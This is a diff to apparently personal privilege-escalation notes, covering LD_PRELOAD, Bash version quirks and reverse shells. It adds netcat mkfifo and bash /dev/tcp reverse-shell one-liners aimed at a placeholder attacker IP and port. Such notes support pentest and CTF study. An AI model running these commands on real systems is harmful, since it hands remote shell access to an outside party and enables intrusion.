@@ -16,9 +16,13 @@
 - Env vars:
   - LD_PRELOAD - loads a shared object before any others when a program is run. 
   - LD_LIBRARY_PATH - provides a list of directories where shared libraries are searched for first
-- Bash rev shell:
+- openBSD rev shell:
+  - rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc attacker_ip attacker_port >/tmp/f
+- Bash rev shell (rev.sh):
   - #!/bin/bash
   - bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1
+- Bash rev shell (cmd):
+  - /bin/bash -c "bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1"
 - Bash:
   - Version < 4.2-048 - possible to create functions with names like paths
   - Version < 4.4 - possible to abuse debug flag PS4
